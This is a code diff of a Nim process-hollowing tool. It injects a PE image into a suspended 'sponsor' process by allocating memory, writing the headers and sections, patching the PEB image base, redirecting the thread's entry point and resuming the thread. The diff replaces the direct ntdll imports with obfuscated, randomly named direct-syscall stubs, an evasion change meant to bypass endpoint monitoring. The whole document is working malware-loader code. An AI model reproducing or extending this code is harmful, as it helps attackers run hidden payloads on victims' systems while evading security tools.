@@ -3,17 +3,16 @@ import winim
 import strutils
 import ptr_math
 
+when defined(hollow5):
+    include syscalls2
+when defined(hollow6):
+    include syscalls3
+
 # Manager           -> -M
 # Allocate          -> -A:<sponsor-process-handle>
 # Write             -> -W:<sponsor-process-handle>
 # Thread context    -> -T:<sponsor-thread-handle>
 # Resume            -> -R:<sponsor-thread-handle>
-
-proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
-proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
-proc NtGetContextThread(ThreadHandle : HANDLE, Context : PCONTEXT): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
-proc NtSetContextThread(ThreadHandle : HANDLE, Context : PCONTEXT): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
-proc NtResumeThread(ThreadHandle: HANDLE, SuspendCount: PULONG): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
 
 
 proc allocateMemoryProcess(
@@ -21,7 +20,7 @@ proc allocateMemoryProcess(
     peImageImageBase: ptr PVOID, 
     peImageSize: ptr size_t
 ) =
-    if NtAllocateVirtualMemory(
+    if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
         processHandle,
         peImageImageBase,
         0,
@@ -59,7 +58,7 @@ proc writeMemoryProcess(
     let sponsorPeb = bi.PebBaseAddress
 
     # Copy PE headers to sponsor process
-    if NtWriteVirtualMemory(
+    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
         processHandle,
         peImageImageBase,
         peBytesPtr,
@@ -71,7 +70,7 @@ proc writeMemoryProcess(
 
     # Copy PE sections to sponsor process  
     for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
-        if NtWriteVirtualMemory(
+        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
             processHandle,
             peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
             peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
@@ -81,7 +80,7 @@ proc writeMemoryProcess(
             quit(1)
     
     # Overwrite sponsor PEB with the new image base address 
-    if NtWriteVirtualMemory(
+    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
         processHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
         unsafeAddr peImageImageBase,
@@ -101,14 +100,14 @@ proc setThreadProcess(
 ) =
     var context: CONTEXT
     context.ContextFlags = CONTEXT_INTEGER
-    if NtGetContextThread(
+    if VzpSdkMDEGHOzTpB( # NtGetContextThread
         threadHandle, 
         addr context
     ) != 0:
         quit(1)
     var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
     context.Rcx = cast[DWORD64](entryPoint)
-    if NtSetContextThread( 
+    if IGyhziwCULdezDSq( # NtSetContextThread
         threadHandle, 
         addr context
     ) != 0:
@@ -118,7 +117,7 @@ proc setThreadProcess(
 proc resumeThreadProcess(
     threadHandle: Handle
 ) =
-    if NtResumeThread(
+    if mAcJDfMgbUNFgsxu( # NtResumeThread
         threadHandle,
         NULL
     ) != 0:
@@ -195,7 +194,7 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
         quit(1)
 
 
-proc hollow3Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
+proc hollow56Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
     
     # Extract process information
     let sponsorProcessHandle = sponsorProcessInfo.hProcess
@@ -215,7 +214,7 @@ proc hollow3Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): b
     discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)
 
  
-proc hollow3Worker*(peStr: string): bool =
+proc hollow56Worker*(peStr: string): bool =
   
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
